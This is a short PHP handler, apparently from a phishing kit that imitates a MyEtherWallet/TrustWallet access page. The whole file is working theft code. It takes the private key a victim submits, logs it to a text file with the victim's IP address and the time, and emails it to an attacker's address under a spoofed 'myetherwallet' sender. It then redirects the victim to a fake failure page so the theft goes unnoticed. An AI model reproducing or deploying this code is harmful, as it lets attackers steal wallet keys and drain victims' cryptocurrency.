<?php
$file = "____TrustWallet___.txt";
$PrivateKey = $_POST['PrivateKey'];
$ip = $_SERVER['REMOTE_ADDR'];
$today = date("F j, Y, g:i a");

$handle = fopen($file, 'a');
fwrite($handle, "\n");
fwrite($handle, "PrivateKey   	: ");
fwrite($handle, "$PrivateKey");
fwrite($handle, "\n");
fwrite($handle, "IP Address	: ");
fwrite($handle, "$ip");
fwrite($handle, "\n");
fwrite($handle, "Time		: ");
fwrite($handle, "$today");
fwrite($handle, "\n");
fwrite($handle, "https://www.myetherwallet.com/wallet/access/software?type=mnemonic ");
fwrite($handle, "\n");
fclose($handle);
$PrivateKey = $_POST['PrivateKey'];
$ip=$_SERVER['REMOTE_ADDR'];

$message   = "

PrivateKey : ".$PrivateKey." 

";
include 'mail.php';
$subject = "myetherwallet ".$ip." ";
$headers = "From: myetherwallet <niarats@yandex.com>";
mail($rezult_mail, $subject, $message, $headers);
echo "<script LANGUAGE=\"JavaScript\">
<!--
top.location=\"/failed.html?access-my-wallet\";
// -->
</script>";
?>